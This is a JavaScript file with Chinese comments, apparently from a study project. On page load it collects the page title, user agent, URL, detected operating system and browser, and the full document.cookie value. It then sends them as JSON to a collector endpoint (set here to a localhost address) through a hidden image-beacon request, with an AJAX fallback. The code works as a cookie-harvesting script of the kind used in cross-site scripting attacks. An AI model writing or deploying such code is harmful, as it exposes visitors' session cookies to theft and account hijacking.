// v1.0  
// 抓取标题
// 抓取 userAgent
// 分析客户端环境(系统, 浏览器环境)
// 抓取cookie值
// 抓取URL地址信息
// 源生ajax请求

window.onload = function() {

    // 抓取标题
    function getTitle() {
        var titleObj = document.getElementsByTagName('title')[0];
        return titleObj.innerHTML;
    }

    // 抓取userAgent
    function getUserAgent() {
        return navigator.userAgent;
    }

    // TODO 通过userAgent 分析数据, 获得当前系统环境, 浏览器环境 
    function parseUserAgent() {}


    // 获取cookie
    function getCookie() {
        return document.cookie;
    }

    // 获取页面URL信息
    function getURL() {
        var url = new Object;
        url.href = window.location.href;
        url.protocol = window.location.protocol;
        url.host  = window.location.host;
        url.port  = window.location.port === "" ? 80 :  window.location.port;
        url.pathname  = window.location.pathname;
        url.search  = window.location.search;
        url.hash  = window.location.hash;
        return url;
    }

    // ajax
    function ajax(type, url, data, success, failed){
        // 创建ajax对象
        var xhr = null;
        if(window.XMLHttpRequest){
            xhr = new XMLHttpRequest();
        } else {
            xhr = new ActiveXObject('Microsoft.XMLHTTP')
        }
     
        var type = type.toUpperCase();
        // 用于清除缓存
        var random = Math.random();
     
        if(typeof data == 'object'){
            var str = '';
            for(var key in data){
                str += key+'='+data[key]+'&';
            }
            data = str.replace(/&$/, '');
        }
     
        if(type == 'GET'){
            if(data){
                xhr.open('GET', url + '?' + data, true);
            } else {
                xhr.open('GET', url + '?t=' + random, true);
            }
            xhr.send();
     
        } else if(type == 'POST'){
            xhr.open('POST', url, true);
            // 如果需要像 html 表单那样 POST 数据，请使用 setRequestHeader() 来添加 http 头。
            xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            xhr.send(data);
        }
     
        // 处理返回数据
        xhr.onreadystatechange = function(){
            if(xhr.readyState == 4){
                if(xhr.status == 200){
                    success(xhr.responseText);
                } else {
                    if(failed){
                        failed(xhr.status);
                    }
                }
            }
        }
    }

    // 侦测操作系统
    function detectOS() {
        var sUserAgent = navigator.userAgent;
        var isWin = (navigator.platform == "Win32") || (navigator.platform == "Windows");
        var isMac = (navigator.platform == "Mac68K") || (navigator.platform == "MacPPC") || (navigator.platform == "Macintosh") || (navigator.platform == "MacIntel");
        if (isMac) return "Mac";
        var isUnix = (navigator.platform == "X11") && !isWin && !isMac;
        if (isUnix) return "Unix";
        var isLinux = (String(navigator.platform).indexOf("Linux") > -1);
        if (isLinux) return "Linux";
        if (isWin) {
            var isWin2K = sUserAgent.indexOf("Windows NT 5.0") > -1 || sUserAgent.indexOf("Windows 2000") > -1;
            if (isWin2K) return "Win2000";
            var isWinXP = sUserAgent.indexOf("Windows NT 5.1") > -1 || sUserAgent.indexOf("Windows XP") > -1;
            if (isWinXP) return "WinXP";
            var isWin2003 = sUserAgent.indexOf("Windows NT 5.2") > -1 || sUserAgent.indexOf("Windows 2003") > -1;
            if (isWin2003) return "Win2003";
            var isWinVista= sUserAgent.indexOf("Windows NT 6.0") > -1 || sUserAgent.indexOf("Windows Vista") > -1;
            if (isWinVista) return "WinVista";
            var isWin7 = sUserAgent.indexOf("Windows NT 6.1") > -1 || sUserAgent.indexOf("Windows 7") > -1;
            if (isWin7) return "Win7";
            var isWin10 = sUserAgent.indexOf("Windows NT 10.0") > -1 || sUserAgent.indexOf("Windows 10") > -1
            if (isWin10) return "Win10";
        }
        return "other";
    }


    /** 侦测浏览器环境
     * 获取浏览器类型以及版本号 
     * 支持国产浏览器:猎豹浏览器、搜狗浏览器、傲游浏览器、360极速浏览器、360安全浏览器、 
     * QQ浏览器、百度浏览器等. 
     * 支持国外浏览器:IE,Firefox,Chrome,safari,Opera等. 
     * 使用方法: 
     * 获取浏览器版本:Browser.client.version 
     * 获取浏览器名称(外壳):Browser.client.name 
    **/  
    var Browser=Browser || (function(window){  
        var document = window.document,  
            navigator = window.navigator,  
            agent = navigator.userAgent.toLowerCase(),  
            //IE8+支持.返回浏览器渲染当前文档所用的模式  
            //IE6,IE7:undefined.IE8:8(兼容模式返回7).IE9:9(兼容模式返回7||8)  
            //IE10:10(兼容模式7||8||9)  
            IEMode = document.documentMode,       
            //chorme  
            chrome = window.chrome || false,  
            System = {  
                //user-agent  
                agent : agent,  
                //是否为IE  
                isIE : /msie/.test(agent),  
                //Gecko内核  
                isGecko: agent.indexOf("gecko")>0 && agent.indexOf("like gecko")<0,  
                //webkit内核  
                isWebkit: agent.indexOf("webkit")>0,  
                //是否为标准模式  
                isStrict: document.compatMode === "CSS1Compat",  
                //是否支持subtitle  
                supportSubTitle:function(){  
                    return "track" in document.createElement("track");  
                },  
                //是否支持scoped  
                supportScope:function(){  
                    return "scoped" in document.createElement("style");  
                },  
                //获取IE的版本号  
                ieVersion:function(){  
                    try {  
                       return agent.match(/msie ([\d.]+)/)[1] || 0;  
                    } catch(e) {  
                       console.log("error");  
                       return IEMode;  
                    }  
                },  
                //Opera版本号  
                operaVersion:function(){  
                    try {  
                        if(window.opera) {  
                            return agent.match(/opera.([\d.]+)/)[1];  
                        } else if(agent.indexOf("opr") > 0) {  
                            return agent.match(/opr\/([\d.]+)/)[1];  
                        }  
                    } catch(e) {  
                        console.log("error");  
                        return 0;  
                    }  
                },  
                //描述:version过滤.如31.0.252.152 只保留31.0  
                versionFilter:function(){  
                    if(arguments.length === 1 && typeof arguments[0] === "string") {  
                        var version = arguments[0];  
                            start = version.indexOf(".");  
                        if(start>0){  
                            end = version.indexOf(".",start+1);  
                            if(end !== -1) {  
                                return version.substr(0,end);  
                            }  
                        }  
                        return version;  
                    } else if(arguments.length === 1) {  
                        return arguments[0];  
                    }  
                    return 0;  
                }  
            };  
              
        try {  
            //浏览器类型(IE、Opera、Chrome、Safari、Firefox)  
            System.type = System.isIE?"IE":  
                window.opera || (agent.indexOf("opr") > 0)?"Opera":   
                (agent.indexOf("chrome")>0)?"Chrome":  
                //safari也提供了专门的判定方式  
                window.openDatabase?"Safari":  
                (agent.indexOf("firefox")>0)?"Firefox":        
                'unknow';  
                  
            //版本号     
            System.version = (System.type === "IE")?System.ieVersion():  
                (System.type === "Firefox")?agent.match(/firefox\/([\d.]+)/)[1]:  
                (System.type === "Chrome")?agent.match(/chrome\/([\d.]+)/)[1]:  
                (System.type === "Opera")?System.operaVersion():  
                (System.type === "Safari")?agent.match(/version\/([\d.]+)/)[1]:  
                "0";  
              
            //浏览器外壳  
            System.shell=function(){  
                //遨游浏览器  
                if(agent.indexOf("maxthon") > 0) {  
                    System.version = agent.match(/maxthon\/([\d.]+)/)[1] || System.version ;  
                    return "傲游浏览器";  
                }  
                //QQ浏览器  
                if(agent.indexOf("qqbrowser") > 0) {  
                    System.version = agent.match(/qqbrowser\/([\d.]+)/)[1] || System.version ;  
                    return "QQ浏览器";  
                }  
                  
                //搜狗浏览器  
                if( agent.indexOf("se 2.x")>0) {  
                    return '搜狗浏览器';  
                }  
                  
                //Chrome:也可以使用window.chrome && window.chrome.webstore判断  
                if(chrome && System.type !== "Opera") {  
                    var external = window.external,  
                        clientInfo = window.clientInformation,  
                        //客户端语言:zh-cn,zh.360下面会返回undefined  
                        clientLanguage = clientInfo.languages;  
                      
                    //猎豹浏览器:或者agent.indexOf("lbbrowser")>0  
                    if( external && 'LiebaoGetVersion' in external) {  
                         return '猎豹浏览器';  
                    }  
                    //百度浏览器  
                    if (agent.indexOf("bidubrowser")>0) {  
                        System.version = agent.match(/bidubrowser\/([\d.]+)/)[1] ||   
                            agent.match(/chrome\/([\d.]+)/)[1];  
                        return "百度浏览器";  
                    }  
                    //360极速浏览器和360安全浏览器  
                    if( System.supportSubTitle() && typeof clientLanguage === "undefined") {  
                        //object.key()返回一个数组.包含可枚举属性和方法名称  
                        var storeKeyLen = Object.keys(chrome.webstore).length,  
                            v8Locale = "v8Locale" in window;  
                        return storeKeyLen > 1? '360极速浏览器':'360安全浏览器';     
                    }  
                    return "Chrome";  
                }   
                return System.type;         
            };  
      
            //浏览器名称(如果是壳浏览器,则返回壳名称)  
            System.name = System.shell();  
            //对版本号进行过滤过处理  
            System.version = System.versionFilter(System.version);  
              
        } catch(e) {  
            console.log("error");  
        }  
        return {  
            client:System  
        };  
          
    })(window);  
    // console.log(Browser.client.name+" "+Browser.client.version);

    // 汇总收集到的数据, 组合成json
    function getCollectData() {
        var data = new Object;
        data.title = getTitle();
        data.userAgent = getUserAgent();
        data.cookie = getCookie();
        data.url = getURL();
        data.systeamInfo = detectOS();
        data.browserInfo = Browser.client.name+" "+Browser.client.version;
        jsonData = JSON.stringify(data);
        console.log(data);// debug
        return jsonData;
    }

    // 发送数据请求
    // url: 接受数据接口地址
    // sendData: 收集到的数据, json格式
    // type: 2种请求, ajax, img
    function sendRequest(url, sendData, type) {
        if (type === 'ajax') {
            // ajax请求
            ajax('post', url, {"data": sendData},function(data){
                    console.log(data);
                }, function(error){
                    console.log(error);
            });
            return;
        }else if (type === 'img') {
            // img请求
            // 为了防止缓存，经常会用毫秒的时间作为随机数
            var _make_rnd  = function(){
                return (+new Date()) + '.r' + Math.floor(Math.random() * 1000);
            };
            var src = url + '?data=' + sendData;
            var win = window;
            var n = 'jsFeImage_' + _make_rnd();
            img = win[n] = new Image();
            img.onload = img.oneror = function() {
                win[n] = null;
            }
            img.src = src;
            return;
        }
    }



    var url = "http://localhost/kaen/studyLumen/public/add";
    var sendData = getCollectData();
    var type = 'img';
    sendRequest(url, sendData, type);
}





